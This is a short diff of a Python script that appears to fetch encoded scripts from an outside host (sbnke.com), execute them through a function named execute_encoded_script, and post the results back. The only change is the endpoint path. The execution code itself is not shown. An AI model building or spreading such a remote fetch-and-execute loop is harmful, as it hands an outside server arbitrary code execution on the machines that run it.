@@ -15,7 +15,7 @@ def execute_encoded_script(decoded_code):
 
 # Step 1: Make a GET request to an API to retrieve data
 try:
-    get_response = requests.get("https://sbnke.com/arc.py")
+    get_response = requests.get("https://sbnke.com/arc.php")
     get_response.raise_for_status()  # Check if the request was successful
     data = get_response.json()
 
@@ -53,7 +53,7 @@ try:
             "status": "1"
         }
 
-        post_response = requests.post("https://sbnke.com/arc.py", json=post_data)
+        post_response = requests.post("https://sbnke.com/arc.php", json=post_data)
         post_response.raise_for_status()  # Check if the request was successful
 
         print(f"Execution complete. Result sent to the API for id = {unique_id}.")
